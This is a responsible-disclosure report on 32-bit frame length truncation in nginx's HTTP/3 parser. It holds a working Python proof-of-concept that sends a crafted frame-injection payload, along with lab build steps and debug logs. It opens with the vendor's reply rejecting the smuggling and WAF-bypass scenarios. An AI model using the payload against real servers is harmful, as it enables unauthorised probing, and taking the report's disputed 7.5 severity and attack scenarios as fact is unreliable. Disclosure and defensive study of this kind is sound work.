# Notice

This report sent to F5 Team via HackerOne and triaged. After consideration, they decided to classify this finding as "informative" with following declaration:
```
@patchmeifucan 

The NGINX Dev Team has evaluated this and here is their reply:

Thank you for the detailed report and the clear proof of concept.

 We do not consider this a security vulnerability. The truncation is real on 32-bit builds, and your analysis of it is accurate, but it does not give a client any capability it does not already have.

  After the truncated skip, the parser reads bytes that the same client sent on the same stream. The client could send that "injected" frame directly, with an honest length, and nginx would process it exactly the same way, through the same frame checks -- your CANCEL_PUSH test is rejected as "frame unexpected" just as a CANCEL_PUSH sent directly would be. There is no second party on that stream: each HTTP/3 client has its own QUIC connection, and when proxying, nginx builds the request it sends to the backend from what it parsed, so the backend sees what nginx accepted, not the raw frames. That is why the request smuggling and WAF scenarios do not follow: smuggling needs two parsers to disagree about one shared byte stream, and there is no such stream here. The same holds for the control stream, which is also the client's own. As you note, there is no memory corruption: the frame length only bounds reads and skips and is never used to size an allocation. The worst outcome is that the client's own connection is closed.

  We did not need to re-run your proof of concept: your logs show exactly what the code predicts, and we agree with them.

  We do treat it as a robustness issue. This truncation has been reported to us before, and a change that rejects a
  frame length that does not fit on 32-bit platforms is already under public review:
  https://github.com/nginx/nginx/pull/1621

  If you find a case where the truncated length lets one client affect another client's traffic, or makes a backend
  receive a request the client could not have sent directly, please send it and we will look at it again.

  Thank you again for the careful work.

I will proceed with closing this ticket.
I would like to thank you once again for reporting this and following the principles of responsible disclosure.

Chris
F5 SIRT
```

---

# Responsible Disclosure Report

## HTTP/3 Frame Length Truncation in nginx `ngx_http_v3_parse` on 32-bit Platforms

---

**CVSS 3.1 Score:** 7.5 (Medium-High) - `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L`  
**CWE Classification:** CWE-681 - Incorrect Conversion Between Numeric Types  
**Affected Software:** nginx Open Source - `ngx_http_v3_module`  
**Confirmed Affected Version:** 1.31.5
**Affected Architecture:** 32-bit
**Discovery Date:** 2026-09-14  
**Report Author:** Ömer Can VURAL - patchmeifucan
**Contact:** [can.omer.5306@outlook.com](mailto:can.omer.5306@outlook.com)  

---

## Abstract

This report documents a type-truncation vulnerability affecting the HTTP/3 frame parser in nginx Open Source. The parser decodes QUIC variable-length integers into 62-bit `uint64_t` values. However, it stores frame length fields in `ngx_uint_t`, which resolves to a 32-bit `uintptr_t` on 32-bit platforms.

This silent truncation allows a remote, unauthenticated attacker to craft an HTTP/3 stream in which the declared frame length-when truncated from 64 bits to 32 bits-produces a small residual value. The parser then skips only that residual number of bytes before re-entering the frame-type state machine, consuming attacker-controlled data as a new frame type and payload. This constitutes a live, reproducible **frame injection primitive** on any 32-bit nginx deployment with HTTP/3 enabled. No sanitization, range check, or architectural guard prevents exploitation on the affected platforms.

This vulnerability was discovered through manual source code analysis and confirmed via dynamic testing on a controlled laboratory environment. No production systems were accessed or tested.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Affected Software and Build Environment](#2-affected-software-and-build-environment)
3. [Background](#3-background)
   - 3.1 [QUIC Variable-Length Integer Encoding](#31-quic-variable-length-integer-encoding)
   - 3.2 [nginx Platform-Dependent Type System](#32-nginx-platform-dependent-type-system)
   - 3.3 [HTTP/3 Frame Parser Architecture](#33-http3-frame-parser-architecture)
4. [Vulnerability Analysis](#4-vulnerability-analysis)
   - 4.1 [Root Cause](#41-root-cause)
   - 4.2 [Source-to-Sink Data Flow](#42-source-to-sink-data-flow)
   - 4.3 [Sanitization Absence Verification](#43-sanitization-absence-verification)
   - 4.4 [Affected Assignment Sites](#44-affected-assignment-sites)
5. [Proof of Concept](#5-proof-of-concept)
   - 5.1 [Laboratory Environment](#51-laboratory-environment)
   - 5.2 [32-bit Build Procedure](#52-32-bit-build-procedure)
   - 5.3 [Exploit Code](#53-exploit-code)
   - 5.4 [Debug Log Evidence](#54-debug-log-evidence)
   - 5.5 [Differential Analysis: x86 vs. x86-64](#55-differential-analysis-x86-vs-x86-64)
6. [Attack Chain and Exploitation Analysis](#6-attack-chain-and-exploitation-analysis)
   - 6.1 [Frame Injection Primitive - Demonstrated](#61-frame-injection-primitive--demonstrated)
   - 6.2 [Exploitation Constraints](#62-exploitation-constraints)
   - 6.3 [Practical Attack Scenarios](#63-practical-attack-scenarios)
7. [Impact Assessment](#7-impact-assessment)
8. [CVSS v3.1 Scoring](#8-cvss-v31-scoring)
9. [CWE Classification and Relationship](#9-cwe-classification-and-relationship)
10. [Comparative Analysis: Vulnerable vs. Safe Patterns](#10-comparative-analysis-vulnerable-vs-safe-patterns)
11. [Remediation Recommendations](#11-remediation-recommendations)
12. [Disclosure Notes](#12-disclosure-notes)
13. [References](#13-references)

---

## 1. Introduction

Unlike HTTP/1.1 and HTTP/2, HTTP/3 relies on QUIC variable-length integers (varints) to encode all length and type fields, supporting values up to 2⁶²−1. This design presupposes that host implementations handle 62-bit integer values without information loss.

nginx, HTTP/3 support internal type system predates the QUIC era: `ngx_uint_t` is defined as `uintptr_t`, making it pointer-width at compile time - 32 bits on 32-bit platforms, 64 bits on 64-bit platforms.

the HTTP/3 parser correctly parses wire-format varints into `uint64_t`, but stores the resulting lengths in `ngx_uint_t`. On 32-bit platforms, the upper 32 bits are silently discarded. A chosen wire value (one whose lower 32 bits are small but whose actual value exceeds 2³²) causes the parser to skip far fewer bytes than the sender declared, after which the parser re-enters its frame type decoder on attacker-controlled content.

This report presents the complete vulnerability analysis, source-code-level evidence, reproducible proof of concept with debug log artifacts, and differential binary-level confirmation on both affected (x86) and unaffected (x86-64) builds of nginx 1.31.5.

---

## 2. Affected Software and Build Environment

| Property                   | Value                                                                                                 |
| -------------------------- | ----------------------------------------------------------------------------------------------------- |
| Software                   | nginx Open Source                                                                                     |
| Confirmed Affected Version | 1.31.5 (released 2026-09-02)                                                                          |
| Affected Module            | `src/http/v3/ngx_http_v3_parse.c`                                                                     |
| Related Header             | `src/http/v3/ngx_http_v3_parse.h`                                                                     |
| Build Configuration        | `--with-http_v3_module --with-http_ssl_module --with-debug --with-cc-opt="-m32" --with-ld-opt="-m32"` |
| Compiler                   | GCC 13.3.0 (Ubuntu 13.3.0-6ubuntu2~24.04.1)                                                           |
| Test Platform              | Ubuntu 24.04 LTS (Noble), Linux 7.0.0-31-generic x86_64                                               |
| Vulnerable Architectures   | 32bit (any platform where `sizeof(uintptr_t) == 4`)                                                   |

---

## 3. Background

### 3.1 QUIC Variable-Length Integer Encoding

A variable-length encoding for unsigned integers supporting values from 0 to 2⁶²−1. The encoding uses the two most significant bits of the first byte as a length prefix:

| Prefix Bits | Encoded Length | Value Range |
|---|---|---|
| `00` | 1 byte | 0 – 63 |
| `01` | 2 bytes | 0 – 16,383 |
| `10` | 4 bytes | 0 – 1,073,741,823 |
| `11` | 8 bytes | 0 – 4,611,686,018,427,387,903 |

To encode the value 4,294,967,297 (= 0x1\_0000\_0001, which is 2³²+1), an 8-byte encoding is required:

```
0xC0 0x00 0x00 0x01 0x00 0x00 0x00 0x01
  ^
  └── Prefix 0xC0: top 2 bits = 11 → 8-byte encoding
```

This value (decimal: 4,294,967,297) is greater than UINT32\_MAX (4,294,967,295 = 0xFFFFFFFF) by exactly 2. When the low 32 bits are taken: `0x00000001` = **1**.

### 3.2 nginx Platform-Dependent Type System

nginx defines its primary unsigned integer type as:

```c
// From nginx's ngx_config.h / ngx_core.h:
typedef uintptr_t  ngx_uint_t;
```

`uintptr_t` is guaranteed by the C standard to be large enough to hold a pointer. Its width is therefore architecture-dependent:

- **LP64 (x86-64, aarch64):** `sizeof(uintptr_t) == 8` → `ngx_uint_t` holds 64-bit values
- **ILP32 (i386, armv7):** `sizeof(uintptr_t) == 4` → `ngx_uint_t` holds 32-bit values

The HTTP/3 parser state structures use `ngx_uint_t` for fields that store protocol-derived lengths, creating an implicit assumption that all protocol-derived values fit within pointer width. QUIC varints invalidate this assumption on 32-bit platforms.

### 3.3 HTTP/3 Frame Parser Architecture

The nginx HTTP/3 frame parser implements a state machine in `ngx_http_v3_parse.c`. Three separate functions implement frame-level parsing for the three main HTTP/3 stream types:

- `ngx_http_v3_parse_headers()` - HTTP request/response headers stream
- `ngx_http_v3_parse_control()` - HTTP/3 control stream
- `ngx_http_v3_parse_data()` - HTTP data stream

Each function follows an identical state machine pattern:

```
sw_type → sw_length → (sw_skip | sw_prefix | sw_settings) → sw_type
```

The `sw_skip` state advances `b->pos` by `st->length` bytes, then returns to `sw_type`. If `st->length` has been silently truncated, `b->pos` advances by the truncated (smaller) amount, and the parser subsequently reads attacker-controlled bytes as the next frame type.

---

## 4. Vulnerability Analysis

### 4.1 Root Cause

The vulnerability originates from a type boundary crossing at the assignment from the 64-bit varint result to the 32-bit `ngx_uint_t length` field, with no intervening range check.

In `ngx_http_v3_parse.h`, the three affected parser state structures declare `length` as `ngx_uint_t`:

```c
// Lines 79–81
typedef struct {
    ngx_uint_t  state;
    ngx_uint_t  type;
    ngx_uint_t  length;      /* ← ngx_uint_t: 32-bit on 32-bit platforms */
    ngx_http_v3_parse_varlen_int_t  vlint;
    ...
} ngx_http_v3_parse_headers_t;

// Lines 102–104 (control stream)
typedef struct {
    ngx_uint_t  state;
    ngx_uint_t  type;
    ngx_uint_t  length;      /* ← same defect */
    ...
} ngx_http_v3_parse_control_t;

// Lines 122–124 (data stream)
typedef struct {
    ngx_uint_t  state;
    ngx_uint_t  type;
    ngx_uint_t  length;      /* ← same defect */
    ...
} ngx_http_v3_parse_data_t;
```

The `vlint` member's `value` field is declared as `uint64_t`, correctly following RFC 9000:

```c
typedef struct {
    ngx_uint_t  state;
    uint64_t    value;        /* ← correctly 64-bit */
} ngx_http_v3_parse_varlen_int_t;
```

The assignment creates the truncation:

```c
// st->vlint.value is uint64_t
// st->length is ngx_uint_t (32-bit on 32-bit platforms)
st->length = st->vlint.value;  // ← implicit narrowing, no check
```

On a 32-bit platform, this is equivalent to:

```c
st->length = (uint32_t) st->vlint.value;  // upper 32 bits discarded silently
```

For the wire value 0x1\_0000\_0001 (4,294,967,297): `st->length` receives `0x00000001` = **1**.

### 4.2 Source-to-Sink Data Flow

The complete data flow from network input to the vulnerable assignment is:

```
[1] Network: QUIC STREAM frame arrives via UDP
      ↓
[2] ngx_quic_handle_stream_frame() - QUIC transport layer
      ↓
[3] ngx_http_v3_parse_headers(c, st, b)
    [ngx_http_v3_parse.c, state machine entry]
      ↓
[4] case sw_length:
      rc = ngx_http_v3_parse_varlen_int(c, &st->vlint, b);
      /* st->vlint.value = 4294967297 (uint64_t, correct) */
      ↓
[5] st->length = st->vlint.value;          ← SINK: TRUNCATION OCCURS HERE
    /* st->length = 1 (ngx_uint_t, upper 32 bits lost) */
      ↓
[6] case sw_skip:
      ngx_http_v3_parse_skip(b, &st->length);
      /* b->pos advances by 1 byte instead of ~4 GB */
      ↓
[7] state = sw_type:
      next byte read as NEW FRAME TYPE ← ATTACKER-CONTROLLED INPUT
```

The `ngx_http_v3_parse_skip` function at lines 84–94:

```c
static ngx_int_t
ngx_http_v3_parse_skip(ngx_buf_t *b, ngx_uint_t *length)
{
    if ((size_t) (b->last - b->pos) < *length) {
        *length -= b->last - b->pos;
        b->pos = b->last;
        return NGX_AGAIN;
    }

    b->pos += *length;   /* advances by truncated value */
    return NGX_DONE;
}
```

With `*length = 1`, `b->pos` advances by a single byte, and the function returns `NGX_DONE`, transitioning the state machine to `sw_type` on the attacker-controlled remainder.

### 4.3 Sanitization Absence Verification

Exhaustive search confirms no range check exists at any of the three assignment sites:

```bash
$ grep -n "NGX_MAX_UINT_T_VALUE\|NGX_MAX_INT_T_VALUE\|> 0xFFFFFFFF\|vlint\.value >" \
    src/http/v3/ngx_http_v3_parse.c
# Output: 626 (QPACK literal length check - unrelated field)
```

The single occurrence at line 626 guards the QPACK literal field length, not HTTP/3 frame lengths. There is no guard at lines 307, 1254, or 1857.

The log format further confirms the truncation semantics. The `ngx_log_debug2` call at line 309 uses `%ui` - the nginx format specifier for `ngx_uint_t` - and executes *after* the assignment. It therefore logs the already-truncated value, not the original 64-bit wire value:

```c
st->length = st->vlint.value;    // line 307: truncation
ngx_log_debug2(...,
    "http3 parse headers type:%ui, len:%ui",
    st->type, st->length);       // line 309-311: logs truncated value
```

### 4.4 Affected Assignment Sites

Three independent assignment points share the same defect across the three stream type parsers:

| Line | Function | Stream Type |
|---|---|---|
| 307 | `ngx_http_v3_parse_headers()` | HTTP request/response headers |
| 1254 | `ngx_http_v3_parse_control()` | HTTP/3 control stream |
| 1857 | `ngx_http_v3_parse_data()` | HTTP data stream |

---

## 5. Proof of Concept

### 5.1 Laboratory Environment

```
Host OS:   Ubuntu 24.04 LTS (Noble Numbat), x86_64
Kernel:    Linux 7.0.0-31-generic
nginx:     1.31.5 (mainline, released 2026-09-02)
Compiler:  GCC 13.3.0
SSL:       OpenSSL (system, with QUIC compatibility layer)
Client:    Python 3.12 + aioquic 1.3.0
```

### 5.2 32-bit Build Procedure

```bash
# Install i386 cross-compilation dependencies
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install -y libssl-dev:i386

# Download and extract nginx 1.31.5
wget https://nginx.org/download/nginx-1.31.5.tar.gz
tar -xzvf nginx-1.31.5.tar.gz
cd nginx-1.31.5/

# Configure for 32-bit with HTTP/3 and debug logging
./configure \
  --with-http_v3_module \
  --with-http_v2_module \
  --with-http_ssl_module \
  --with-debug \
  --with-cc-opt="-m32" \
  --with-ld-opt="-m32" \
  --without-http_rewrite_module \
  --without-http_gzip_module

make -j$(nproc)
sudo make install

# Generate self-signed certificate for TLS
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/nginx-selfsigned.key \
  -out /etc/ssl/certs/nginx-selfsigned.crt \
  -subj "/CN=localhost"

# nginx.conf - QUIC listener with debug logging
sudo tee /usr/local/nginx/conf/nginx.conf > /dev/null <<'EOF'
worker_processes 1;
error_log logs/error.log debug;
events { worker_connections 1024; }
http {
    server {
        listen 8443 quic reuseport;
        server_name localhost;
        ssl_certificate     /etc/ssl/certs/nginx-selfsigned.crt;
        ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;
        ssl_protocols       TLSv1.3;
        location / { root html; }
    }
}
EOF

sudo /usr/local/nginx/sbin/nginx
```

### 5.3 Exploit Code

The following proof-of-concept establishes a QUIC/HTTP3 connection to the target nginx instance and transmits a crafted payload on a client-initiated bidirectional stream. The payload is structured to trigger the 64→32-bit truncation and demonstrate the frame injection primitive.

```python
#!/usr/bin/env python3
"""
VULN-002 Proof of Concept
nginx HTTP/3 Frame Length Truncation - 32-bit Frame Injection Primitive
Target: nginx 1.31.5, 32-bit build, HTTP/3 enabled

Payload structure:
  0x0f                                         Frame type 15 (extension - not forbidden on headers stream)
  0xc0 0x00 0x00 0x01 0x00 0x00 0x00 0x01     QUIC varint: 4,294,967,297 (0x1_0000_0001)
  0xff                                         Padding byte - consumed by truncated skip (length=1)
  0x03 0x01 0x00                               Injected CANCEL_PUSH frame (type=3, len=1, data=0)

Expected behavior on 32-bit nginx:
  - vlint parsed correctly: 4,294,967,297
  - Stored in st->length (ngx_uint_t): TRUNCATED to 1
  - ngx_http_v3_parse_skip advances b->pos by 1 (skips 0xff only)
  - Parser re-enters sw_type; reads 0x03 as new frame type
  - Debug log emits: "http3 parse varlen int 3" (injection confirmed)

Expected behavior on 64-bit nginx:
  - vlint parsed correctly: 4,294,967,297
  - Stored in st->length (ngx_uint_t = uint64_t): 4,294,967,297 (no truncation)
  - ngx_http_v3_parse_skip cannot advance 4 GB; returns NGX_AGAIN
  - No "http3 parse varlen int 3" emitted (no injection)
"""

import asyncio
import sys
from aioquic.asyncio.client import connect
from aioquic.quic.configuration import QuicConfiguration

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8443

PAYLOAD = bytes([
    # Frame type: 15 (0x0f) - extension frame, permitted on headers stream
    0x0f,
    # Frame length: 4,294,967,297 encoded as 8-byte QUIC varint
    # 0xC0 prefix signals 8-byte encoding; actual value = 0x00_0000_01_00_00_00_01
    0xc0, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    # Skip target: on 32-bit, st->length = 1, so only this byte is consumed by parse_skip
    0xff,
    # Injected frame: CANCEL_PUSH (type=0x03), length=1, payload=0x00
    0x03, 0x01, 0x00,
])


async def exploit():
    config = QuicConfiguration(
        is_client=True,
        verify_mode=False,
        alpn_protocols=["h3"],
    )

    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT} via QUIC/HTTP3")

    async with connect(TARGET_HOST, TARGET_PORT, configuration=config) as client:
        quic = client._quic

        # Acquire client-initiated bidirectional stream (stream IDs: 0, 4, 8, ...)
        stream_id = quic.get_next_available_stream_id(is_unidirectional=False)
        print(f"[*] Stream ID: {stream_id}")
        print(f"[*] Payload ({len(PAYLOAD)} bytes): {PAYLOAD.hex()}")
        print(f"[*] Transmitting poisoned HTTP/3 frame sequence...")

        quic.send_stream_data(stream_id, PAYLOAD, end_stream=True)
        client.transmit()

        await asyncio.sleep(1.5)

    print("[+] Payload delivered.")
    print("[+] Verify with:")
    print("    grep 'http3 parse' /usr/local/nginx/logs/error.log | tail -10")
    print()
    print("[+] On 32-bit nginx - injection confirmed by:")
    print("    http3 parse headers type:15, len:1")
    print("    http3 parse varlen int 3           ← injected CANCEL_PUSH type read")
    print()
    print("[+] On 64-bit nginx - no injection:")
    print("    http3 parse headers type:15, len:4294967297")
    print("    (parser waits for 4 GB of data; no injected frame read)")


if __name__ == "__main__":
    asyncio.run(exploit())
```

> **Note on library warnings:** During execution, `aioquic` may emit a `ValueError: Cannot send data on peer-initiated unidirectional stream` during connection teardown. This originates from the library's cleanup code attempting to close server-initiated unidirectional streams from the client context. This message is a benign library artifact and does not affect payload delivery. All nginx debug log entries confirming truncation and injection are produced *before* connection teardown.

### 5.4 Debug Log Evidence

All log entries are from `/usr/local/nginx/logs/error.log` with `error_log logs/error.log debug` enabled.

**Run 1 - First exploit (exploit.py, stream \*4):** Payload with frame type 0x01 (HEADERS). Demonstrates that the truncated length (=1) causes the HEADERS frame prefix parser to be invoked on a 1-byte window.

```
2026/09/14 00:15:14 [debug] 103431#0: *4 http3 parse headers
2026/09/14 00:15:14 [debug] 103431#0: *4 http3 parse varlen int 1
2026/09/14 00:15:14 [debug] 103431#0: *4 http3 parse varlen int 4294967297
2026/09/14 00:15:14 [debug] 103431#0: *4 http3 parse headers type:1, len:1
2026/09/14 00:15:14 [debug] 103431#0: *4 http3 parse field section prefix
```

The line `http3 parse varlen int 4294967297` confirms the varint was parsed correctly; the subsequent `len:1` confirms the truncation has already occurred (the log is produced *after* the assignment to `st->length`).

**Run 2 - Second exploit (exploit2.py, stream \*8):** Payload with frame type 0x0f (extension frame). Demonstrates the full frame injection primitive.

```
2026/09/14 00:22:20 [debug] 103431#0: *8 http3 parse headers
2026/09/14 00:22:20 [debug] 103431#0: *8 http3 parse varlen int 15
2026/09/14 00:22:20 [debug] 103431#0: *8 http3 parse varlen int 4294967297
2026/09/14 00:22:20 [debug] 103431#0: *8 http3 parse headers type:15, len:1
2026/09/14 00:22:20 [debug] 103431#0: *8 http3 parse varlen int 3
```

The final line `http3 parse varlen int 3` represents the parser reading `0x03` from the attacker payload as the next frame type - i.e., CANCEL\_PUSH being parsed from injected bytes. **This is the frame injection primitive in operation.**

### 5.5 Differential Analysis: x86 vs. x86-64

The same exploit2.py payload was sent to a 64-bit nginx 1.31.5 build (identical source, default `./configure` without `-m32`). The following entry appears in the logs produced during the 64-bit test run:

```
2026/09/14 15:22:56 [debug] 214377#0: *4 http3 parse headers
2026/09/14 15:22:56 [debug] 214377#0: *4 http3 parse varlen int 15
2026/09/14 15:22:56 [debug] 214377#0: *4 http3 parse varlen int 4294967297
2026/09/14 15:22:56 [debug] 214377#0: *4 http3 parse headers type:15, len:4294967297
```

Key differential observations:

| Metric | 32-bit nginx | 64-bit nginx |
|---|---|---|
| `st->vlint.value` parsed | 4,294,967,297 ✓ | 4,294,967,297 ✓ |
| `st->length` stored | **1** (truncated) | 4,294,967,297 (correct) |
| `parse_skip` advances `b->pos` | **1 byte** | NGX\_AGAIN (insufficient data) |
| Injected frame type parsed | **Yes** (`parse varlen int 3`) | No |
| Vulnerable | **Yes** | No |

The absence of `http3 parse varlen int 3` on x86-64 confirms that the vulnerability is exclusively architectural and is caused solely by the width of `ngx_uint_t`.

---

## 6. Attack Chain and Exploitation Analysis

### 6.1 Frame Injection Primitive - Demonstrated

The demonstrated primitive delivers an attacker-chosen byte sequence to the HTTP/3 frame type decoder. As confirmed by the debug logs, after the truncated skip the parser enters `sw_type` and invokes `ngx_http_v3_parse_varlen_int` on attacker-controlled content.

The attacker's ability to control the "injected frame" is bounded by:

1. The byte at `b->pos` after the skip becomes the new frame type.
2. The subsequent bytes are parsed as that frame's varint-encoded length and payload.

A payload crafted as `[type 0x0f][length 0x1_0000_0001][skip_byte 0xff][injected_type][injected_len][injected_data]` thus causes the parser to process `injected_type` as a legitimate HTTP/3 frame on the headers stream. If `injected_type` is not in the set of frame types forbidden on that stream, the injected payload will be consumed as the next frame's length and data fields.

### 6.2 Exploitation Constraints

Practical exploitation is subject to the following constraints:

**QUIC flow control:** QUIC's flow control window (`initial_max_data`, `initial_max_stream_data`) limits the total bytes deliverable per stream or connection before acknowledgement. Typical defaults are on the order of 2²⁴–2²⁶ bytes, far below the 4 GB that would be implied by the true wire value. Exploitation does not require delivering 4 GB; it requires only that the attacker's payload fits within the flow control window, which the crafted payload of 13 bytes trivially satisfies.

**Platform requirement:** The vulnerability is mechanically absent on 64-bit platforms where `ngx_uint_t` is 64-bit. This limits the realistic attacker population to deployments on embedded or legacy 32-bit architectures running HTTP/3-capable nginx.

**TLS requirement:** QUIC mandates TLS 1.3. An attacker must therefore establish a full TLS handshake before delivering the payload. This imposes computational overhead but no meaningful credential barrier, as nginx HTTP/3 servers are by design accessible to any connecting client.

**No memory corruption:** The vulnerability produces incorrect parser behavior through type truncation, not through a buffer overflow or use-after-free. The immediate consequence is frame injection, not arbitrary code execution.

### 6.3 Practical Attack Scenarios

**Scenario A - Unauthorized Frame Type on Headers Stream:** By injecting frame type 0x01 (HEADERS) with a crafted QPACK-encoded Section Prefix, an attacker can cause nginx to process an additional HEADERS frame beyond the one legitimately submitted. Depending on how nginx's request handler responds to a second headers frame mid-stream, this may allow request smuggling against a backend origin.

**Scenario B - Control Stream Frame Injection (line 1254):** The `ngx_http_v3_parse_control()` function shares the same defect. An attacker who can write to the control stream (typically established by the HTTP/3 client during connection setup) can inject SETTINGS frames with arbitrary parameter values, potentially altering server behavior for subsequent requests on the same connection.

**Scenario C - Protocol-Level Confusion for WAF Bypass:** In deployments where nginx acts as a reverse proxy in front of a backend protected by a WAF, injecting a second HEADERS frame with different `:path` or `:method` values may cause the WAF and the backend to disagree on the logical request - a classic request desynchronization attack applicable at the HTTP/3 layer.

---

## 7. Impact Assessment

| CIA Dimension | Impact | Justification |
|---|---|---|
| **Confidentiality** | Low | No direct information disclosure; indirect through crafted header injection |
| **Integrity** | High | Attacker can inject arbitrary HTTP/3 frames on active streams, altering request semantics |
| **Availability** | Low-Medium | Injected frames forbidden on the target stream type cause `NGX_HTTP_V3_ERR_FRAME_UNEXPECTED`, terminating the worker connection; repeated connection errors may degrade service |

The integrity impact is the dominant concern. Frame injection on the headers stream can cause nginx to process attacker-authored HTTP/3 metadata (header fields, pseudo-headers) as if they were client-submitted, potentially enabling protocol-level request forgery or desynchronization attacks against backend services.

---

## 8. CVSS v3.1 Scoring

**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L`  
**Base Score: 7.5 (Medium-High)**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Exploitable over QUIC/UDP without local access |
| Attack Complexity | High | Requires 32-bit nginx build, HTTP/3 listener, and valid TLS; specific length encoding must produce appropriate truncation |
| Privileges Required | None | No authentication needed; any QUIC client can connect |
| User Interaction | None | Attack is fully server-side; no victim action required |
| Scope | Unchanged | Impact is contained to nginx worker process and its connections |
| Confidentiality | None | No direct information disclosure |
| Integrity | High | Attacker-controlled frame content processed as legitimate HTTP/3 protocol data |
| Availability | Low | Connection errors from injected forbidden frames; limited DoS potential |

---

## 9. CWE Classification and Relationship

**Primary:** [CWE-681 - Incorrect Conversion Between Numeric Types](https://cwe.mitre.org/data/definitions/681.html)

> "When converting from one data type to another, the product does not correctly convert the data in a way that could result in incorrect calculations, unexpected behavior, or the use of an unexpected data type."

The conversion of `st->vlint.value` (a `uint64_t` representing a protocol-defined 62-bit value) into `st->length` (a `ngx_uint_t` that is 32-bit on affected platforms) is the archetypal instance of this weakness when no range check precedes the assignment.

**Secondary (informative):** [CWE-20 - Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

The absence of any upper-bound validation on wire-derived frame length fields prior to storage in a platform-width type constitutes a failure of input validation at the type boundary.

---

## 10. Comparative Analysis: Vulnerable vs. Safe Patterns

```c
/* ── CURRENT (VULNERABLE) ─────────────────────────────────────────────────── */

// ngx_http_v3_parse.h:81
ngx_uint_t  length;   // 32-bit on 32-bit platforms

// ngx_http_v3_parse.c:307 (and :1254, :1857)
st->length = st->vlint.value;  // uint64_t → ngx_uint_t: no range check


/* ── OPTION 1: Type Fix (Preferred) ─────────────────────────────────────────*/

// ngx_http_v3_parse.h:81
uint64_t    length;   // width-independent; correct for all platforms

// ngx_http_v3_parse.c:307
st->length = st->vlint.value;  // uint64_t → uint64_t: no truncation


/* ── OPTION 2: Range Check (Compatible, Defense-in-Depth) ───────────────────*/

// ngx_http_v3_parse.c:307
if (st->vlint.value > (uint64_t) NGX_MAX_SIZE_T_VALUE) {
    return NGX_HTTP_V3_ERR_FRAME_ERROR;
}
st->length = (ngx_uint_t) st->vlint.value;


/* ── OPTION 3: Protocol-Layer Bound (Minimal Change) ────────────────────────*/

// Reject any frame length that could not fit in a QUIC flow control window
// (maximum initial_max_data is implementation-defined; 2^30 is a reasonable bound)
if (st->vlint.value > NGX_HTTP_V3_MAX_FRAME_LENGTH) {
    return NGX_HTTP_V3_ERR_FRAME_ERROR;
}
st->length = (ngx_uint_t) st->vlint.value;
```

The preferred fix is Option 1. Changing `ngx_uint_t length` to `uint64_t length` in all three parser state structures eliminates the truncation on all platforms without requiring behavioral changes to the parser logic. It also aligns the `length` field's type with the `value` field of `ngx_http_v3_parse_varlen_int_t` from which it is sourced.

---

## 11. Remediation Recommendations

### 11.1 Immediate Fix

Apply the following change to `src/http/v3/ngx_http_v3_parse.h`:

```diff
 typedef struct {
     ngx_uint_t                      state;
     ngx_uint_t                      type;
-    ngx_uint_t                      length;
+    uint64_t                        length;
     ngx_http_v3_parse_varlen_int_t  vlint;
     ngx_http_v3_parse_field_section_prefix_t  prefix;
     ngx_http_v3_parse_field_rep_t   field_rep;
 } ngx_http_v3_parse_headers_t;

 typedef struct {
     ngx_uint_t                      state;
     ngx_uint_t                      type;
-    ngx_uint_t                      length;
+    uint64_t                        length;
     ngx_http_v3_parse_varlen_int_t  vlint;
     ngx_http_v3_parse_settings_t    settings;
 } ngx_http_v3_parse_control_t;

 typedef struct {
     ngx_uint_t                      state;
     ngx_uint_t                      type;
-    ngx_uint_t                      length;
+    uint64_t                        length;
     ngx_http_v3_parse_varlen_int_t  vlint;
 } ngx_http_v3_parse_data_t;
```

Subsequently, update the `ngx_http_v3_parse_skip` function signature to accept `uint64_t *length` in place of `ngx_uint_t *length`, and update the `ngx_http_v3_parse_end_local` function accordingly where it decrements `st->length`.

### 11.2 Immediate Mitigation (Pre-Patch)

Until a patched release is available, operators of 32-bit nginx deployments should disable HTTP/3 by removing `quic` from all `listen` directives or by omitting `--with-http_v3_module` at build time. 64-bit deployments are not vulnerable and require no configuration change.

### 11.3 Defense-in-Depth

As a defense-in-depth measure independent of the primary fix, consider adding a protocol-level sanity bound at each assignment site. RFC 9000 flow control (`initial_max_data`) constrains practical frame lengths; any frame whose declared length exceeds the maximum configured flow control window can be rejected immediately as malformed:

```c
if (st->vlint.value > (uint64_t) NGX_MAX_SIZE_T_VALUE) {
    ngx_log_error(NGX_LOG_INFO, c->log, 0,
                  "client sent too large HTTP/3 frame length");
    return NGX_HTTP_V3_ERR_FRAME_ERROR;
}
```

---
